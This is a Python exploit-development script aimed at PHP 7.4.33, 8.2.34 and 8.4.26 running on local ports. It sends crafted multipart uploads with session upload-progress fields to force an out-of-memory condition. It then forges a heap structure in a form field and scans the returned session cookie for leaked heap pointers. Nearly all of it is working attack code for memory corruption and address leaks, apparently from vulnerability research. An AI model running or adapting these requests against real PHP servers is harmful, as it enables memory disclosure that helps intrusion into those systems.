"""Try file upload OOM on 7.4.33.
The idea: upload a large file that exceeds memory_limit, triggering OOM.
File uploads are handled differently from POST fields - they go to temp files.
But the metadata (filename, content-type, etc.) is stored in memory.
"""
import sys, os, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

def test_file_upload(port, file_mb, label):
    """Test file upload to trigger OOM."""
    URL = f"http://127.0.0.1:{port}/"
    t = E.Target(URL, timeout=180.0, verbose=False)

    # Request 1: File upload
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    # Large file upload
    parts.append({"name": "file", "filename": "big.bin", "data": b"B" * int(file_mb * 1024 * 1024)})
    print(f"  {label}: file upload {file_mb}MB", flush=True)

    try:
        r1 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=180)
    except Exception as e:
        print(f"    REQUEST1 ERROR: {e}", flush=True)
        return False
    time.sleep(0.5)

    # Request 2: Try to leak
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(841):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    try:
        r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=180)
    except Exception as e:
        print(f"    REQUEST2 ERROR: {e}", flush=True)
        return False
    raw = E.parse_cookie(r2)
    oom = len(raw) > 100
    c = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    chunk = c.most_common(1)[0][0] if c else 0
    tag = " *** OOM/LEAK ***" if oom else "(no OOM)"
    chunk_str = f" chunk=0x{chunk:x}" if chunk else ""
    print(f"    cookie={len(raw)}B{tag}{chunk_str}", flush=True)
    return oom

print("=== File upload OOM test on 7.4.33 ===", flush=True)
test_file_upload(18108, 12, "7.4.33")
time.sleep(1)
test_file_upload(18108, 64, "7.4.33")
time.sleep(1)
test_file_upload(18108, 256, "7.4.33")
time.sleep(1)

print("\n--- 8.2.34 (port 18111) ---", flush=True)
test_file_upload(18111, 12, "8.2.34")
time.sleep(1)
test_file_upload(18111, 64, "8.2.34")
time.sleep(1)

print("\n--- 8.4.26 control (port 18113) ---", flush=True)
test_file_upload(18113, 12, "8.4.26")
time.sleep(1)

print("\n=== done ===", flush=True)
